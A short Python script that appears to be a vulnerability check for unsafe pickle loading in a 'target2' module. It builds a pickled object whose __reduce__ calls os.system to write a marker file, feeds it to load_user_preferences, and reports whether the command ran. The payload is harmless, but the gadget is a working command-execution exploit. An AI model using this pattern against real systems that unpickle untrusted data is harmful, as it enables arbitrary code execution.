import pickle
import os
from target2 import load_user_preferences

if os.path.exists("proof2.txt"):
    os.remove("proof2.txt")

class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ('echo hacked > proof2.txt',))

print("Building a malicious 'preferences' file...")
malicious_data = pickle.dumps(MaliciousPayload())

print("Loading it through the normal function, exactly like a real saved-preferences file would be...")
load_user_preferences(malicious_data)

if os.path.exists("proof2.txt"):
    print("  --> VULNERABLE! Just LOADING the data secretly ran a command.")
else:
    print("  --> looks safe")